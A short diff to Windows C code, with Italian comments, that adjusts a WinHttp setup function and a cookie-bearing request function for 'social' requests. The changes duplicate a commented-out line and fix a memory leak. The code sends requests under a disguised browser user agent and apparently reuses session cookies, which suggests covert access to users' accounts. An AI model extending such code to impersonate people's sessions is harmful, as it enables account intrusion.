@@ -113,6 +113,7 @@ VOID SocialWinHttpSetup(__in LPWSTR strDestUrl)
 
 	// Crea una sessione per winhttp.
 	//gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
+	//gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent
 	gHttpSocialSession = WinHttpOpen(SOCIAL_USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent	
 
 	// Cerca nel registry le configurazioni del proxy
@@ -262,8 +263,9 @@ DWORD HttpSocialRequest(
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
-	*dwRespSize = 0;
-	*lpRecvBuff = NULL;
+	*dwRespSize = 0;	
+	//spostato all'inizio della funzione perchè causava un leak in caso di errore prima di questo punto (free di questa variabile non inizializzata)
+	//*lpRecvBuff = NULL;
 	for(;;) 
 	{
 		if (!WinHttpReadData(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
